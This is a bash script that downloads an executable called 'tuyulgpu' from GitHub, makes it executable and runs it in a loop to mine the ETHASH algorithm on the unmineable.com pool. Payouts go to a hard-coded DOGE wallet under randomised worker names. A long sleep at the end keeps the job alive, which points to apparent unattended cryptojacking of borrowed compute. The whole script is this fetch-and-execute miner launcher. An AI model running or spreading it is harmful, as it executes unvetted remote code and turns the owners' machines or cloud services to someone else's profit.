#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=DOGE:D5o7ggptjmEoKME4rdCBWdaVkZagiZBzvB
WORKER=$(echo $(shuf -i 10-40 -n 1)-TRTL)
wget https://github.com/pogchampv10/CLB/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999
